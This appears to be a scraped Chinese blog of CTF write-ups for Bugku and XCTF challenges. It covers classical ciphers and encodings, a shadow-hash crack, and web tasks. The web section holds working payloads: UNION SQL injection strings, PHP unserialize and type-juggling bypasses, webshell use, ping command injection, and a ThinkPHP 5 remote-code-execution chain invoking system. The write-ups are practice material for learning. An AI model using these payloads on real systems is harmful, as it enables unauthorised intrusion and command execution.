01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101。\n 摩斯加密，上脚本。\n获得flag。\n简单加密  Des:e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA。\n 这是啥\u0026hellip;\nA的ASCII码值为65，=的ASCII码值为61，最后是两个A，可能是凯撒加密后的Base64编码。\n附上凯撒解密脚本。\n获得字符串a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==，Base64 在线编码解码 | Base64 加密解密 - Base64.us。\n获得flag。\n散乱的密文  Des:lf5{ag024c483549d7fd@@1}，一张纸条上凌乱的写着2 1 6 5 3 4。\n 试了试栅栏解密的分组数，不对。\n获得flag。\n凯撒部长的奖励  Des:就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}。\n 凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)，一位一位尝试，位移20时得出flag。\n一段Base64  Des:N/A。\n 给了一大段的Base64编码，就不贴上来了。\n解码。\n进行Unescape解码。\n十六进制转文本。\n再进行Unescape。\n十进制转文本。\n\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x38;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x33;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x36;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x36;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x32;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x39;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x30;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x38;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x34;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x33;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x31;\u0026amp;#x39;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x31;\u0026amp;#x30;\u0026amp;#x31;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x33;\u0026amp;#x37;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x35;\u0026amp;#x35;\u0026amp;#x3b;\u0026amp;#x26;\u0026amp;#x23;\u0026amp;#x36;\u0026amp;#x38;\u0026amp;#x3b; HTML解码。\n\u0026amp;#102;\u0026amp;#108;\u0026amp;#97;\u0026amp;#103;\u0026amp;#37;\u0026amp;#55;\u0026amp;#66;\u0026amp;#99;\u0026amp;#116;\u0026amp;#102;\u0026amp;#95;\u0026amp;#116;\u0026amp;#102;\u0026amp;#99;\u0026amp;#50;\u0026amp;#48;\u0026amp;#49;\u0026amp;#55;\u0026amp;#49;\u0026amp;#55;\u0026amp;#113;\u0026amp;#119;\u0026amp;#101;\u0026amp;#37;\u0026amp;#55;\u0026amp;#68; HTML解码。\nflag%7Bctf_tfc201717qwe%7D\r改为正常的flag格式。\n.!?  Des:N/A。\n 再怎么改，也改不掉对Ook的独特记忆，https://www.splitbrain.org/services/ook。\n获得flag。\n+[]-  Des:N/A。\n +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++.+ +++++ .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;- -.+++ +++.\u0026lt;\r++++[ -\u0026gt;+++ +\u0026lt;]\u0026gt;+ +++.\u0026lt; +++++ [-\u0026gt;-- ---\u0026lt;] \u0026gt;.\u0026lt;++ ++[-\u0026gt; ++++\u0026lt; ]\u0026gt;+++ .\u0026lt;+++\r[-\u0026gt;-- -\u0026lt;]\u0026gt;- ----. ++++. \u0026lt;+++[ -\u0026gt;+++ \u0026lt;]\u0026gt;+. \u0026lt;++++ [-\u0026gt;-- --\u0026lt;]\u0026gt; ----- -.\u0026lt;++\r+[-\u0026gt;+ ++\u0026lt;]\u0026gt; ++.-. ----- ---.\u0026lt; +++[- \u0026gt;+++\u0026lt; ]\u0026gt;+++ .---- .\u0026lt;+++ [-\u0026gt;-- -\u0026lt;]\u0026gt;-\r.\u0026lt;+++ +++[- \u0026gt;---- --\u0026lt;]\u0026gt; ----- ----. +.\u0026lt;++ +++++ +[-\u0026gt;+ +++++ ++\u0026lt;]\u0026gt; +++++\r+++++ .\u0026lt;\rOok的兄弟，Brainfuck又来了，https://www.splitbrain.org/services/ook。\n获得flag。\n奇怪的密码  Des:突然天上一道雷电，gndk€rlqhmtkwwp}z。\n g n d k的ASCII码值分别为103 110 100 107。\nf l a g的ASCII码值分别为102 108 97 103。\n发现了规律，上python。\ns = \u0026#39;gndk€rlqhmtkwwp}z\u0026#39; i = 0 flag = \u0026#39;\u0026#39; while i \u0026lt; len(s): num = ord(s[i]) - (i + 1) flag += chr(num) i += 1 print(flag) 获得flag。\n托马斯.杰斐逊  Des:N/A。\n 这个之前有做过。\n先根据密钥对各行进行替换。\n然后根据密文，对第一列元素进行排列，对每行元素进行循环。\n唯一读的通顺的就是倒数第六列：XSXSBUGKUADMIN。\n获得flag。\nzip伪加密  Des:N/A。\n 题目给了一个压缩包，打开里面的flag.txt文档需要密码，当然这里说了伪加密。\n先来分析一下ZIP文件的三个组成部分：\n压缩源文件数据区：\r50 4B 03 04：这是头文件标记（0x04034b50）\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r00 00：扩展记录长度\r压缩源文件目录区：\r50 4B 01 02：目录中文件文件头标记(0x02014b50)\r3F 00：压缩使用的 pkware 版本\r14 00：解压文件所需 pkware 版本\r00 00：全局方式位标记（有N/A加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）\r08 00：压缩方式\r5A 7E：最后修改文件时间\rF7 46：最后修改文件日期\r16 B5 80 14：CRC-32校验（1480B516）\r19 00 00 00：压缩后尺寸（25）\r17 00 00 00：未压缩尺寸（23）\r07 00：文件名长度\r24 00：扩展字段长度\r00 00：文件注释长度\r00 00：磁盘开始号\r00 00：内部文件属性\r20 00 00 00：外部文件属性\r00 00 00 00：局部头部偏移量\r压缩源文件目录结束标志：\r50 4B 05 06：目录结束标记\r00 00：当前磁盘编号\r00 00：目录区开始磁盘编号\r01 00：本磁盘上纪录总数\r01 00：目录区中纪录总数\r59 00 00 00：目录区尺寸大小\r3E 00 00 00：目录区对第一张磁盘的偏移量\r00 00：ZIP 文件注释长度\r找到头文件标记50 4B 03 04与文件头标记50 4B 01 02，将后面对应的全局方式位标记00 09改为00 00破解伪加密，保存后成功打开flag.txt。\n获得flag。\n告诉你个秘密  Des:636A56355279427363446C4A49454A7154534230526D6843 56445A31614342354E326C4B4946467A5769426961453067。\n 数字范围0-9，字母范围A-E。\n十六进制转字符串。\ncjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g\rBase64转字符串。\nr5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM\r这个东西，看看键盘，刚好把中间的键给围了起来。\nTONGYUAN\r获得flag。\n这不是md5  Des:666c61677b616537333538376261353662616566357d。\n 数字范围1-8，字母范围b-d。\n十六进制转文本。\n获得flag。\n贝斯家族  Des:@iH\u0026lt;,{bdR2H;i6*Tm,Wx2izpx2!。\n 都说了是Base编码了，本菜鸟一个个试，试出来是Base91编码，进行解码。\n获得flag。\n富强民主  Des:公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治。\n 这个\u0026hellip;查了一下，这是核心价值观编码。CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com)。\n获得flag。\npython  Des:N/A。\n 给了两个python代码，附上：\n暂时解不出\u0026hellip;\n进制转换  Des:二进制、八进制、十进制、十六进制，你能分的清吗？\n d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e\r思路：先把所有数据转换为统一的形式，再转换为字符串。这里转为十六进制。\n十六进制转字符串。\n获得flag。\naffine  Des:y = 17*x-8 flag{szzyfimhyzd}。\n affine为仿射的意思，那么这就是仿射加密了。\n上脚本。\ns = \u0026#39;szzyfimhyzd\u0026#39; list = [] for i in s: list.append(ord(i) - 97) flag = \u0026#39;\u0026#39; for i in list: for j in range(0, 26): c = (17 * j - 8) % 26 if (c == i): flag += chr(j + 97) print(flag) 获得flag。\nCrack it  Des:破解该文件，获得密码。\n 给了一个shadow文件，记事本打开看看，内容：\nroot:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::\r这个需要应该是破解用户密码，使用kali的john工具，命令：\njohn shadow 结果：\n可以发现密码为hellokitty。\n获得flag。\nrsa  Des:N/A。\n N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597\re : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619\renc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192\r暂时无解。\n来自宇宙的信号  Des:银河战队出击。\n 搜索标准银河字母，找到对应表。\n对应下来就是：\nnopqrst\r获得flag。\nReverse 入门逆向  Des:N/A。\n 用IDA打开看看，定位到main函数。\n有很多的mov指令，66h为f，6Ch为l，猜测这一串就是flag，点击对应的值按R进行转换。\n获得flag。\nEasy_vb  Des:N/A。\n IDA打开文件，上下翻一下。\n获得flag。\nEasy_Re  Des:Hint: 1.逆向常用的工具有IDA 、ollydbg。\n IDA打开文件，挨个看看。\n搜索CTF。\n双击定位去看看。\n这里的xmmword和dq可以转化成字符串，选中按R进行转换。\n将字符串转换为合理的顺序。\n获得flag。\n游戏过关  Des:N/A。\n 先用PEiD看看，\n社工 密码  DES:姓名：张三，生日：19970315。\n 唔，因为是第一个题，应该不会太难，猜测内容为zs19970315。\n获得flag。\nPwn pwn1  Des:nc 114.116.54.89 10001。\n  本文链接：Bugku | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/bugku/","summary":"Bugku Web Web1  Des：flag{}。\n 查看源码即可。\nWeb2  Des：输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des：flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;) value = {\u0026#39;what\u0026#39;:\u0026#39;flag\u0026#39;} r = s.post(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;, value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版。\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET[\u0026#39;num\u0026#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo \u0026#39;flag{********}\u0026#39;; } 利用1a绕过，例：","title":"Bugku"},{"content":"攻防世界 Web view source  Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n 查看页面源码。\n获得flag。\nrobots  Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n 在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。\n获得flag。\nbackup  Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n 尝试backup.php，无效。\n使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。\n获得flag。\ncookie  Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’\n 使用burp抓包，得到cookie.php。\n继续使用burp抓包，查看Response。\n获得flag。\ndisable_button  Des：N/A。\n 页面的flag按钮无响应，猜测被禁用，查看控制台元素。\n\u0026lt;input class=\u0026#34;btn btn-default\u0026#34; disabled\u0026gt; 将此处的disabled前三字符删除，改为abled，按下按钮。\n获得flag。\nweak_auth  Des：小宁写了一个登陆验证页面，随手就设了一个密码。\n 查看源码。\n\u0026lt;from class=\u0026#34;form-inline\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;./check.php\u0026#34;\u0026gt; 有一个验证页面，访问它。\n页面空白，查看源码，提示。\n\u0026lt;!--maybe you need a dictionary--\u0026gt;\r这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确\u0026hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php  Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。\n \u0026lt;?php show_source(__FILE__); include(\u0026#34;config.php\u0026#34;); $a = @$_GET[\u0026#39;a\u0026#39;]; $b = @$_GET[\u0026#39;b\u0026#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u0026gt; 1234) { echo $flag2; } ?\u0026gt;包含文件config.php，查看源码，无隐藏信息。\n页面通过GET传参，根据条件a=0且a为真，b不能为数字且大于1234，添加?a=0e1\u0026amp;b=12346s，获得flag。\nget_post  Des：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n 跟着提示走，URL后添加?a=1。\nhackbar进行POST传参。\n获得flag。\nxff_referer  Des：X老师告诉小宁其实xff和referer是可以伪造的。\n X-Forwarded-For: 123.123.123.123\rburp抓包，在Request添加：\nReferer: https://www.google.com\r查看Response。\n获得flag。\nwebshell  Des：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。\n 御剑扫描后台，没用\u0026hellip;\n查了一下资料，需要其他工具，选择中国蚁剑。\n配好之后添加题目网址，输入密码：shell。\n点击进入，查看flag.txt。\n获得flag。\ncomman_execution  Des：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n 给出一个ping窗口，尝试本地回环。\n命令可以正常执行，尝试拼接。\n可以正常执行拼接命令，查看当前目录所有文件\n没用，而且只能在当前目录执行命令，尝试搜索当前用户所有txt文档。\n发现flag，根据路径使用cat命令查看flag.txt。\n获得flag。\nsimple_js  Des：小宁发现了一个网页，但却一直输不对密码。\n X-Forwarded-For: 220.249.52.133\r要求输入密码，随机输入后显示错误，查看网页源码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JS\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function dechiffre(pass_enc) { var pass = \u0026#34;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\u0026#34;; var tab = pass_enc.split(\u0026#39;,\u0026#39;); var tab2 = pass.split(\u0026#39;,\u0026#39;); var i,j,k,l = 0,m,n,o,p = \u0026#34;\u0026#34;; i = 0; j = tab.length; k = j + (l) + (n=0); n = tab2.length; for (i = (o=0); i \u0026lt; (k = j = n); i++) { o = tab[i-l]; p += String.fromCharCode((o = tab2[i])); if(i == 5) break; } for (i = (o=0); i \u0026lt; (k = j = n); i++) { o = tab[i-l]; if (i \u0026gt; 5 \u0026amp;\u0026amp; i \u0026lt; k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p; return pass; } String[\u0026#34;fromCharCode\u0026#34;](dechiffre(\u0026#34;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\u0026#34;)); h = window.prompt(\u0026#39;Enter password\u0026#39;); alert(dechiffre(h)); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;/html\u0026gt; 代码审计，加了很多不必要的代码，将fromCharCode字符串中的十六进制转文本，得到55,56,54,79,115,69,114,116,107,49,50，写一个python脚本返回整数所对应的Unicode字符：\ns = [55,56,54,79,115,69,114,116,107,49,50] for i in s: print(chr(i), end=\u0026#39;\u0026#39;) 将输出结果加上给定flag格式。\n获得flag。\nNewsCenter  Des：N/A。\n 只给了一个输入框，源码无提示。\n尝试查看是否存在SQL注入，依次输入1、2、3、4，到4时页面无回显，初步判断存在。继续尝试注入语句，发现页面会无法处理请求，发现需要把前面的语句先闭合再进行注入。\n爆表：\n\u0026#39;and -1 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES# 最下面有一个secret_table，这里面应该就是我们需要的信息。\n爆列：\n\u0026#39;and -1 union select 1,COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=\u0026#39;secret_table\u0026#39;# 得到两个表：\nid\rfl4g\r爆字段：\n\u0026#39;and -1 union select 1,2,fl4g from secret_table# Web进阶 baby_web  Des：想想初始页面是哪个。\n 页面为1.php。\ndirb扫描目录，初始页面被重定向到1.php。\n尝试访问index.php，在控制台查看访问记录。\n获得flag。\nTraining-WWW-Robots  Des：N/A。\n 访问robots.txt。\n访问fl0g.php。\n获得flag。\nunserialize3  Des：N/A。\n  PHP__wakeup()函数漏洞\n在程序执行前，serialize()函数会首先检查是否存在一个魔术方法_sleep()，如果存在，_sleep()方法会先被调用， 然后才执行序列化操作。这个功能可以用于清理对象并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个wakeup方法。如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个__wakeup()是可以被绕过的。\n__wakeup触发于unserilize() 调用之前，当反序列化时的字符串所对应的对象的数目被修改，wake 的函数就不会被调用且不会重建为对象，但是会触发其他的魔术方法。\n 本题使用code进行传参，利用__wakeup函数漏洞，当序列化字符串表示对象属性个数的值大于真实个数属性时就会跳过__wakeup的执行。\n先用php脚本跑出序列化字符串：\n\u0026lt;?php class xctf { public $flag = \u0026#39;111\u0026#39;; public function __wakeup() { exit(\u0026#39;bad requests\u0026#39;); } } $c = new xctf(); print(serialize($c)); ?\u0026gt;结果:\nO:4:\u0026quot;xctf\u0026quot;:1:{s:4:\u0026quot;flag\u0026quot;;s:3:\u0026quot;111\u0026quot;;}\r将上述结果赋给code参数。\n获得flag。\nWeb php unserialize  Des：N/A。\n \u0026lt;?php class Demo { private $file = \u0026#39;index.php\u0026#39;; public function __construct($file) { $this-\u0026gt;file = $file; } function __destruct() { echo @highlight_file($this-\u0026gt;file, true); } function __wakeup() { if ($this-\u0026gt;file != \u0026#39;index.php\u0026#39;) { //the secret is in the fl4g.php  $this-\u0026gt;file = \u0026#39;index.php\u0026#39;; } } } if (isset($_GET[\u0026#39;var\u0026#39;])) { $var = base64_decode($_GET[\u0026#39;var\u0026#39;]); if (preg_match(\u0026#39;/[oc]:\\d+:/i\u0026#39;, $var)) { die(\u0026#39;stop hacking!\u0026#39;); } else { @unserialize($var); } } else { highlight_file(\u0026#34;index.php\u0026#34;); } ?\u0026gt;简单写个php脚本：\n\u0026lt;?php class Demo { private $file = \u0026#39;index.php\u0026#39;; public function __construct($file) { $this-\u0026gt;file = $file; } function __destruct() { echo @highlight_file($this-\u0026gt;file, true); } function __wakeup() { if ($this-\u0026gt;file != \u0026#39;index.php\u0026#39;) { // the secret is in the fl4g.php  $this-\u0026gt;file = \u0026#39;index.php\u0026#39;; } } } $tmp = new Demo(\u0026#39;fl4g.php\u0026#39;); $res = serialize($tmp); // O:4:\u0026#34;Demo\u0026#34;:1:{s:10:\u0026#34;Demofile\u0026#34;;s:8:\u0026#34;fl4g.php\u0026#34;;} $res = str_replace(\u0026#39;O:4\u0026#39;, \u0026#39;O:+4\u0026#39;, $res);\t// 绕过preg_match() $res = str_replace(\u0026#39;:1:\u0026#39;, \u0026#39;:2:\u0026#39;, $res);\t// 绕过__wakeup() var_dump($res); // \u0026#34;O:+4:\u0026#34;Demo\u0026#34;:1:{s:10:\u0026#34;Demofile\u0026#34;;s:8:\u0026#34;fl4g.php\u0026#34;;} var_dump(base64_encode(res)); // TzorNDoiRGVtbyI6Mjp7czoxMdoiAERlbW8AZmlsZSI7czo40iJmbDRnLnBocCI7fQ== ?\u0026gt;给变量var传参TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==。\n获得flag。\nphp rce  Des：N/A。\n 查看控制台元素，无有用信息。\n御剑扫描后台，发现robots.txt。\n根据题目名称搜索Think PHP V5 rce漏洞\n发现补丁修改后的代码：\n$controller = strp_tags($result[1] ?: $config[\u0026#39;default_controller\u0026#39;]); if (!preg_match(\u0026#39;/^[A-Za-z](\\w)*$/\u0026#39;, $controller)) { throw new HttpException(404, \u0026#39;controller not exists:\u0026#39; . $controller); } 从$controller分析，补丁对其名称进行了过滤，继续查看：\ntry { $instance = Loader::controller( $controller, $config[\u0026#39;url_controller_layer\u0026#39;], $config[\u0026#39;controller_suffix\u0026#39;], $config[\u0026#39;empty_controller\u0026#39;] ); } 代码对controller进行了实例化，进入到Loader部分查看：\npublic static function controller($name, $layer=\u0026#39;controller\u0026#39;, $appendSuffix=false, $empty=\u0026#39;\u0026#39;) { list($module, $class) = self::getModuleAndClass($name, $layer, $appendSuffix); if (class_exists($class)) { return App::invokeClass($class); } if ($empty) { $emptyClass = self::parseClass($module, $layer, $empty, $appendSuffix); if (class_exists($emptyClass)) { return new $emptyClass(Request::instance()); } } } 如果类name存在，进行实例化，并跟进getModuleAndClass：\nprotected static function getModuleAndClass($name, $layer, $appendSuffix) { if (false != strpos($name, \u0026#39;\\\\\u0026#39;)) { $module = Request::instance()-\u0026gt;module(); $class = $name; } else { if (strpos($name, \u0026#39;/\u0026#39;)) { list($module, $name) = explode(\u0026#39;/\u0026#39;, $name, 2); } else { $module = Request::instance()-\u0026gt;module(); } $class = self::parseClass($module, $layer, $name, $appendSuffix); } return [$module, $class]; } 此函数将module和class返回，用于实例化，利用命名空间的特点，如果能够控制此处的class，即补丁内的controller，就可以实例化任何类。若将控制器设置为\\think\\App，可以构造payload调用其方法invokeFunction：\npublic static function invokeFunction($function, $var = []) { $reflect = new \\ReflectionFunction($function); $args = self::bindParams($reflect, $vars); // 记录执行信息  self::$debug \u0026amp;\u0026amp; Log::record(\u0026#39;[RUN]\u0026#39; . $reflect-\u0026gt;__toString(), \u0026#39;info\u0026#39;); return $reflect-\u0026gt;invokeArgs($args); } \\think\\App/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=dir\r接下来设置controller为\\think\\App：\n$controller = strp_tags($result[1] ?: $config[\u0026#39;default_controller\u0026#39;]); 把result[1]的值传递到$controller中：\npublic static function module($result, $config, $convert=null) 寻找使用module的位置：\nprotected static function exec($dispatch, $config) { ... $data = self::module( $dispatch[\u0026#39;module\u0026#39;], $config, isset($dispatch[\u0026#39;convert\u0026#39;] ? $dispatch[\u0026#39;convert\u0026#39;] : null) ); ... } $result来自$dispatch['module']，往前看：\npublic static function run(Request $request=null) { ... $dispatch = self::dispatch; if (empty($dispatch)) { $dispatch = self::routeCheck($request, $config); } ... $data = self::exec($dispatch, $config); ... } 跟踪routeCheck：\npublic static function routeCheck($request, array $config) { ... result = Route::check($request, $path, $depr, $config[\u0026#39;url_domain_deploy\u0026#39;]) ... } 发现解析URL并未进行安全检测。\n从Request::path()跟踪到pathinfo()：\npublic function pathinfo() { if (is_null($this-\u0026gt;pathinfo)) { if (isset($_GET[Config::get(\u0026#39;var_pathinfo\u0026#39;)])) { // 判断URL是否含有兼容模式参数  $_SERVER[\u0026#39;PATH_INFO\u0026#39;] = $_GET[Config::get(\u0026#39;var_pathinfo\u0026#39;)]; unset($_GET[Config::get(\u0026#39;var_pathinfo\u0026#39;)]); } elseif (IS_CLI) { // CLI模式下 index.php module/controller/action/params/...  $_SERVER[\u0026#39;PATH_INFO\u0026#39;] = isset($_SERVER[\u0026#39;argv\u0026#39;][1]) ? $_SERVER[\u0026#39;argv\u0026#39;][1] : \u0026#39;\u0026#39;; } // 分析 PATHINFO 信息  if (!isset($_SERVER[\u0026#39;PATH_INFO\u0026#39;])) { foreach (Config::get(\u0026#39;pathinfo_fetch\u0026#39;) as $type) { if (!empty($_SERVER[$type])) { $_SERVER[\u0026#39;PATH_INFO\u0026#39;] = (0 == strops($_SERVER[$type], $_SERVER[\u0026#39;SCRIP_NAME\u0026#39;])) ? substr($_SERVER[$type], strlen($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;])) : $_SERVER[$type]; break; } } } $this-\u0026gt;pathinfo = empty($_SERVER[\u0026#39;PATH_INFO\u0026#39;]) ? \u0026#39;/\u0026#39; : ltrim($_SERVER[\u0026#39;PATH_INFO\u0026#39;], \u0026#39;/\u0026#39;); } return $this-\u0026gt;pathinfo; } var_info默认配置为s，可以通过$_GET['s']进行传参\n构造payload：\n?s=index/\\think\\App/invokefunction\u0026amp;function=call_user_func_array\u0026amp;vars[0]=system\u0026amp;vars[1][]=dir\r获得flag。\nsupersqli  Des：随便注。\n 看源码。\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;easy_sql\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt; 取材于某次真实环境渗透，只说一句话:开发和安全缺一不可 \u0026lt;/h1\u0026gt; \u0026lt;!-- sqlmap是没有灵魂的 --\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34;\u0026gt; 姿势:\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;inject\u0026#34; value=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; \u0026lt;/form\u0026gt; 